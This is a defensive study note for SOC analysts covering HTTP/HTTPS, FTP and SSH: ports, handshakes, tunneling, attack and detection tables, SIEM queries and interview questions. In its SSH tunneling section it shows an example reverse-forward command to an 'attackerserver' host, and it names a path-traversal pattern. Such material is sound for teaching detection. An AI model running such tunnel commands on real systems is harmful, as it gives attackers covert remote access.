# 🔌 Network Protocols — HTTP, FTP & SSH — Full Deep Dive

> **Source:** Professor Messer | **Topic #:** 13 | **Module:** 2 | **Status:** ✅ Complete

---

## 1. HTTP & HTTPS — HyperText Transfer Protocol

### 1.1 Definition
**HTTP** is an application-layer protocol that defines how clients (browsers) request resources from web servers and how servers respond. **HTTPS** is HTTP with TLS (Transport Layer Security) encryption layered on top.

| Feature | HTTP | HTTPS |
|---------|------|-------|
| Port | 80 | 443 |
| Encryption | None — plaintext | TLS encrypted |
| Authentication | None | Server certificate (CA-signed) |
| Status today | Insecure — avoid | Standard for all web traffic |

---

### 1.2 How HTTP Works — Step by Step

```
Step 1 — Client opens TCP connection to server (port 80 or 443)
Step 2 — TLS handshake (HTTPS only):
          ├── Client sends supported TLS versions + cipher suites
          ├── Server sends certificate + chosen cipher
          ├── Client verifies certificate against trusted CA
          └── Session keys exchanged — encrypted channel established
Step 3 — Client sends HTTP request:
          GET /index.html HTTP/1.1
          Host: www.example.com
          User-Agent: Mozilla/5.0
          Accept: text/html
Step 4 — Server processes request
Step 5 — Server sends HTTP response:
          HTTP/1.1 200 OK
          Content-Type: text/html
          Content-Length: 1234
          [HTML content]
Step 6 — Connection closed (HTTP/1.1) or kept alive (HTTP/1.1 keep-alive, HTTP/2)
```

---

### 1.3 HTTP Methods

| Method | Purpose | SOC note |
|--------|---------|---------|
| **GET** | Retrieve a resource | Most common — parameters in URL |
| **POST** | Submit data to server | Login forms, file uploads — data in body |
| **PUT** | Upload/replace a resource | Can be abused for web shell upload |
| **DELETE** | Delete a resource | Dangerous if unauthenticated |
| **HEAD** | GET without response body | Used for reconnaissance |
| **OPTIONS** | List supported methods | Used by attackers to fingerprint server |
| **PATCH** | Partial update | |
| **TRACE** | Echo request back | Disabled on most servers (XST attack) |

---

### 1.4 HTTP Status Codes

| Code | Meaning | SOC relevance |
|------|---------|--------------|
| **200** | OK — success | Normal |
| **301/302** | Redirect | Phishing redirect chains |
| **400** | Bad Request | Malformed attack attempt |
| **401** | Unauthorized | Auth bypass attempts |
| **403** | Forbidden | Access control working |
| **404** | Not Found | Directory brute force (many 404s) |
| **429** | Too Many Requests | Rate limiting triggered |
| **500** | Internal Server Error | Possible successful exploit |
| **503** | Service Unavailable | DDoS impact |

---

### 1.5 HTTP Versions

| Version | Key features |
|---------|-------------|
| **HTTP/1.0** | One request per connection |
| **HTTP/1.1** | Persistent connections, pipelining |
| **HTTP/2** | Multiplexed streams, header compression, binary protocol |
| **HTTP/3** | Runs over QUIC (UDP-based) — faster, reduced latency |

---

### 1.6 TLS — How HTTPS Secures Traffic

```
TLS Handshake (simplified):
  Client → Server: "Hello, I support TLS 1.3, here are my cipher suites"
  Server → Client: "Hello, use AES-256-GCM, here's my certificate"
  Client: Verifies certificate against trusted CA store
  Client → Server: "Certificate valid. Here's key exchange data"
  Both sides derive session keys
  Encrypted communication begins
```

**TLS versions:**
```
TLS 1.0 / 1.1  →  Deprecated — do not use (vulnerable)
TLS 1.2        →  Still widely used — acceptable
TLS 1.3        →  Current standard — fastest, most secure
SSL 2.0 / 3.0  →  Completely broken — never use (POODLE, DROWN)
```

---

## 2. FTP — File Transfer Protocol

### 2.1 Definition
**FTP** is an application-layer protocol for transferring files between a client and server. It uses two separate channels: one for commands, one for data.

| Feature | Detail |
|---------|--------|
| Command port | TCP 21 |
| Data port | TCP 20 (active mode) |
| Encryption | None — credentials and data sent in plaintext |
| Authentication | Username + password (or anonymous) |

> **Security warning:** FTP sends everything in plaintext — including passwords. Capturing FTP traffic with Wireshark reveals credentials instantly. FTP should not be used on modern networks.

---

### 2.2 FTP Modes

#### Active Mode
```
Client → Server port 21: "Connect to me on port 54321 for data"
Server → Client port 54321: Opens data connection FROM server TO client

Problem: Client firewall often blocks incoming connections from server
```

#### Passive Mode (PASV) — Most common today
```
Client → Server port 21: "I want passive mode"
Server → Client: "Connect to me on port 50000 for data"
Client → Server port 50000: Opens data connection FROM client TO server

Advantage: Client initiates all connections — firewall-friendly
```

---

### 2.3 Secure Alternatives to FTP

| Protocol | Port | How it's secured | Notes |
|----------|------|-----------------|-------|
| **SFTP** | 22 | Runs entirely over SSH — encrypted | Not related to FTP — completely different protocol |
| **FTPS** | 990 (explicit: 21) | FTP + TLS/SSL encryption | FTP with encryption added |
| **SCP** | 22 | Secure Copy over SSH | Simple file copy, no directory listing |

---

### 2.4 FTP Commands (Key ones)

```
USER username    →  Send username
PASS password    →  Send password (PLAINTEXT!)
LIST             →  List directory contents
RETR filename    →  Download file
STOR filename    →  Upload file
DELE filename    →  Delete file
MKD dirname      →  Make directory
QUIT             →  Disconnect
PASV             →  Enter passive mode
PORT             →  Enter active mode
```

---

## 3. SSH — Secure Shell

### 3.1 Definition
**SSH** is a cryptographic network protocol that provides secure remote access to systems, secure file transfers, and encrypted tunneling. It replaced Telnet (plaintext remote access) as the standard for remote administration.

| Feature | SSH | Telnet |
|---------|-----|--------|
| Port | 22 | 23 |
| Encryption | Full encryption | None — plaintext |
| Authentication | Password or public key | Password only |
| Status | Standard — use this | Obsolete — never use |

---

### 3.2 How SSH Works — Step by Step

```
Step 1 — TCP connection established to port 22
Step 2 — Version exchange: client and server agree on SSH version
Step 3 — Algorithm negotiation:
          ├── Key exchange algorithm (e.g., Diffie-Hellman)
          ├── Encryption algorithm (e.g., AES-256-CTR)
          ├── MAC algorithm (e.g., HMAC-SHA2-256)
          └── Compression (optional)
Step 4 — Key exchange: session keys derived
Step 5 — Server authentication:
          Client verifies server's host key against known_hosts file
          (prevents MITM — "trust on first use" model)
Step 6 — User authentication:
          ├── Password authentication (encrypted)
          └── Public key authentication (preferred — no password sent)
Step 7 — Encrypted session established
          ├── Remote shell
          ├── File transfer (SFTP/SCP)
          └── Port forwarding / tunneling
```

---

### 3.3 SSH Authentication Methods

#### Password Authentication
```
Client sends encrypted password to server
Server verifies against user database
Weakness: Vulnerable to brute force, credential stuffing
```

#### Public Key Authentication (Preferred)
```
Setup:
  1. Generate key pair: ssh-keygen
     → id_rsa (private key — kept secret on client)
     → id_rsa.pub (public key — copied to server)
  2. Copy public key to server: ~/.ssh/authorized_keys

Authentication:
  1. Client tells server "I want to use key authentication"
  2. Server sends a challenge encrypted with client's public key
  3. Client decrypts with private key, sends proof
  4. Server verifies — no password needed
  
Advantage: Private key never leaves client — immune to password attacks
```

---

### 3.4 SSH Tunneling

SSH can forward ports — creating encrypted tunnels for other traffic.

#### Local Port Forwarding
```
ssh -L 8080:internalserver:80 user@jumphost

Effect: Traffic to localhost:8080 → encrypted SSH tunnel → internalserver:80
Use: Access internal resources through a bastion/jump host
Abuse: Attackers tunnel C2 traffic through SSH to bypass firewall
```

#### Remote Port Forwarding
```
ssh -R 4444:localhost:22 user@attackerserver

Effect: Attacker's server port 4444 → victim's port 22
Abuse: Attacker on internal host creates reverse shell through SSH
```

#### Dynamic Port Forwarding (SOCKS Proxy)
```
ssh -D 1080 user@server

Effect: Creates SOCKS5 proxy — all traffic routed through SSH tunnel
Use: Browse through remote server, bypass content filters
Abuse: Attackers use as proxy to hide traffic origin
```

---

### 3.5 SSH Key Files

```
~/.ssh/id_rsa          →  Private key (NEVER share)
~/.ssh/id_rsa.pub      →  Public key (share freely)
~/.ssh/authorized_keys →  Server: list of allowed public keys
~/.ssh/known_hosts     →  Client: list of trusted server host keys
~/.ssh/config          →  SSH client configuration
/etc/ssh/sshd_config   →  Server SSH daemon configuration
```

---

## 4. Protocol Comparison — Full Table

| Protocol | Port(s) | Transport | Encrypted | Purpose | Secure alternative |
|----------|---------|-----------|-----------|---------|-------------------|
| HTTP | 80 | TCP | No | Web traffic | HTTPS |
| HTTPS | 443 | TCP | Yes (TLS) | Secure web traffic | — |
| FTP | 20/21 | TCP | No | File transfer | SFTP, FTPS |
| SFTP | 22 | TCP | Yes (SSH) | Secure file transfer | — |
| FTPS | 990/21 | TCP | Yes (TLS) | Secure file transfer | — |
| SSH | 22 | TCP | Yes | Remote access, tunneling | — |
| Telnet | 23 | TCP | No | Remote access | SSH |
| SCP | 22 | TCP | Yes (SSH) | Secure file copy | — |

---

## 5. Key Terms & Terminology

| Term | Meaning |
|------|---------|
| **HTTP** | HyperText Transfer Protocol — web communication |
| **HTTPS** | HTTP + TLS — encrypted web communication |
| **TLS** | Transport Layer Security — encryption protocol |
| **SSL** | Secure Sockets Layer — predecessor to TLS (deprecated) |
| **FTP** | File Transfer Protocol — plaintext file transfer |
| **SFTP** | SSH File Transfer Protocol — secure file transfer over SSH |
| **FTPS** | FTP Secure — FTP with TLS encryption |
| **SSH** | Secure Shell — encrypted remote access |
| **Telnet** | Insecure remote access — replaced by SSH |
| **Public key** | Shareable half of SSH key pair — placed on server |
| **Private key** | Secret half of SSH key pair — stays on client |
| **Port forwarding** | Tunneling traffic through SSH to another destination |
| **Known hosts** | File storing trusted server SSH fingerprints |
| **Certificate** | Digital document proving server identity (HTTPS) |
| **CA** | Certificate Authority — trusted entity that signs certificates |
| **Cipher suite** | Combination of algorithms used in TLS session |

---

## 6. 🔐 SOC Analyst Relevance

These three protocols appear in virtually every SOC investigation.

### HTTP/HTTPS Attacks & Detection

| Attack | What happens | Detection |
|--------|-------------|-----------|
| **C2 over HTTPS** | Malware communicates with C2 using HTTPS — blends with normal traffic | Beaconing pattern in proxy logs, JA3 fingerprinting, unusual user agents |
| **SQL Injection** | Malicious SQL in HTTP parameters | IDS/WAF alerts, 500 errors, unusual URL parameters |
| **XSS** | Malicious scripts in HTTP responses | WAF alerts, script tags in URLs/forms |
| **Directory traversal** | ../../../etc/passwd in URL | 404 spike, path traversal patterns in web logs |
| **Web shell upload** | Attacker uploads PHP/ASPX shell via PUT/POST | Unusual file types uploaded, new files in web root |
| **SSL stripping** | Downgrade HTTPS to HTTP | HTTP traffic on HTTPS-only sites |
| **Malicious redirects** | 301/302 chains leading to phishing | Proxy logs showing redirect chains to suspicious domains |

### FTP Attacks & Detection

| Attack | What happens | Detection |
|--------|-------------|-----------|
| **FTP brute force** | Password guessing on FTP port 21 | Failed AUTH attempts in FTP logs |
| **Anonymous FTP abuse** | Unauthorized access using anonymous login | AUTH with user "anonymous" |
| **FTP data exfiltration** | Large files transferred via FTP outbound | High bytes on port 20/21 outbound |
| **FTP bounce attack** | Use FTP server to port scan third parties | Unusual PORT commands to external IPs |
| **Credential sniffing** | Capture plaintext FTP passwords | Network capture on port 21 |

### SSH Attacks & Detection

| Attack | What happens | Detection |
|--------|-------------|-----------|
| **SSH brute force** | Automated password guessing on port 22 | Rapid failed auth attempts in auth.log |
| **SSH key theft** | Attacker steals private key to gain access | Unusual SSH login from new IP/location |
| **SSH tunneling (C2)** | Attacker tunnels C2 traffic inside SSH | Long-duration SSH sessions, port forwarding |
| **Reverse SSH shell** | Attacker creates outbound SSH from victim | Outbound SSH connections from servers |
| **MITM on SSH** | Intercept SSH if host key not verified | Host key change warning — investigate immediately |
| **Weak SSH config** | Password auth enabled, root login allowed | Config audit findings |

### SIEM Queries

```
# HTTP — detect directory brute force (many 404s from one source)
index=webserver status_code=404 | stats count by src_ip | where count > 50

# HTTP — unusual user agents (malware/scanner)
index=webserver NOT useragent IN ("Mozilla*","Chrome*","Safari*","curl*")
| stats count by useragent, src_ip

# HTTPS — C2 beaconing (regular interval connections)
index=proxy dst_port=443 | timechart span=1m count by dst_domain

# FTP — brute force detection
index=ftp event="authentication failed" | stats count by src_ip | where count > 10

# FTP — anonymous login attempt
index=ftp username=anonymous OR username=ftp

# SSH — brute force (many failed logins)
index=auth event="Failed password" dst_port=22
| stats count by src_ip | where count > 20

# SSH — successful login after many failures (brute force success)
index=auth event="Accepted password" dst_port=22 src_ip IN
[search index=auth event="Failed password" | stats count by src_ip | where count > 10]

# SSH — outbound SSH from servers (reverse shell indicator)
index=network src_ip IN (server_subnet) dst_port=22 direction=outbound

# SSH — long duration sessions (possible tunneling)
index=network dst_port=22 duration > 3600
```

### JA3 Fingerprinting for HTTPS

JA3 is a method to fingerprint TLS clients based on the ClientHello parameters — even when traffic is encrypted.

```
Each TLS implementation has a unique JA3 hash:
  Chrome browser   →  known JA3 hash
  Metasploit       →  known malicious JA3 hash
  Cobalt Strike    →  known malicious JA3 hash

SOC use: Block known malicious JA3 hashes at the firewall/IPS
         Alert when unknown JA3 hash appears in environment
```

> **Real SOC scenario:** Web server logs show 3,000 POST requests to `/wp-login.php` from 50 different IPs over 10 minutes — all with the same unusual user agent string. Classic distributed WordPress brute force attack. SOC analyst blocks the user agent at WAF, implements rate limiting on the login endpoint, checks if any login succeeded, and resets credentials if needed.

---

## 7. Common Interview Questions

**Q1. What is the difference between HTTP and HTTPS?**
> HTTP (port 80) transmits data in plaintext — anyone intercepting the traffic can read it. HTTPS (port 443) wraps HTTP in TLS encryption, ensuring confidentiality, integrity, and server authentication via certificates. All modern web traffic should use HTTPS — plain HTTP is considered insecure and is flagged as a finding in security audits.

**Q2. What is the difference between FTP, SFTP, and FTPS?**
> FTP (ports 20/21) transfers files in plaintext — insecure. SFTP (port 22) is a completely different protocol that runs over SSH — fully encrypted. FTPS (port 990 or 21 with explicit negotiation) is standard FTP with TLS encryption added. For secure file transfer, use SFTP or FTPS — never plain FTP.

**Q3. What is SSH public key authentication and why is it preferred over passwords?**
> Public key authentication uses a key pair — a private key (kept on the client) and a public key (placed on the server). The server sends a challenge that only the private key can solve — the private key never travels over the network. It's preferred over passwords because it's immune to brute force attacks, credential stuffing, and phishing — there's no password to steal.

**Q4. How can SSH be abused by attackers?**
> Attackers abuse SSH in several ways: SSH tunneling to route C2 traffic through encrypted channels that bypass firewalls, reverse SSH shells to establish outbound connections from compromised hosts, port forwarding to pivot through networks, and stealing SSH private keys to gain authenticated access. Detecting unusual SSH sessions — long duration, outbound from servers, new source IPs — is key.

**Q5. What HTTP status codes are most relevant to a SOC analyst?**
> 404 spikes indicate directory brute forcing. 401/403 indicate access control checks firing. 500 errors after unusual requests suggest a possible successful exploit. 200 responses to suspicious POST requests to sensitive endpoints deserve investigation. 301/302 redirect chains from known-good sites to suspicious domains indicate possible phishing or compromise.

**Q6. What is JA3 fingerprinting and how is it used in a SOC?**
> JA3 creates a fingerprint of a TLS client based on parameters in the ClientHello message — even when the traffic is fully encrypted. Known malware frameworks (Metasploit, Cobalt Strike) have characteristic JA3 hashes. SOC analysts use JA3 hashes to detect malicious TLS clients even in encrypted HTTPS traffic, without decrypting it.

---

## 8. Quick Revision Summary

```
HTTP/HTTPS:
  HTTP   →  Port 80, plaintext, insecure
  HTTPS  →  Port 443, TLS encrypted, standard
  Methods: GET (retrieve), POST (submit), PUT (upload), DELETE
  Status: 200 (OK), 404 (not found), 500 (server error)
  TLS versions: 1.2 (OK), 1.3 (best), 1.0/1.1/SSL (broken)

FTP:
  FTP    →  Ports 20/21, plaintext credentials — avoid
  SFTP   →  Port 22, over SSH — use this
  FTPS   →  Port 990, FTP + TLS — acceptable
  Active mode:  Server initiates data connection to client
  Passive mode: Client initiates data connection to server (firewall-friendly)

SSH:
  Port   →  22 (replaces Telnet port 23)
  Auth   →  Password (weak) or Public key (strong — preferred)
  Uses   →  Remote shell, SFTP, SCP, port forwarding, tunneling
  Files  →  id_rsa (private), id_rsa.pub (public), authorized_keys, known_hosts

SOC key threats:
  HTTP/S  →  C2 beaconing, SQLi, XSS, web shells, directory traversal
  FTP     →  Brute force, anonymous login, credential sniffing, exfiltration
  SSH     →  Brute force, tunneling C2, reverse shells, key theft
  
Key detection:
  HTTP  →  404 spikes, unusual user agents, POST to sensitive paths
  FTP   →  Auth failures, anonymous logins, large outbound transfers
  SSH   →  Auth failures, outbound SSH from servers, long sessions
```

---

*Previous topic → [DNS & DHCP](./dns-dhcp.md)*

---

## 🎉 Module 2 Complete!

Topics covered in this module:
- ✅ TCP/IP Model
- ✅ Subnetting
- ✅ VLANs
- ✅ DNS & DHCP
- ✅ Network Protocols — HTTP, FTP, SSH

**Next module → Wireless Networking, VPNs, Network Monitoring & more**
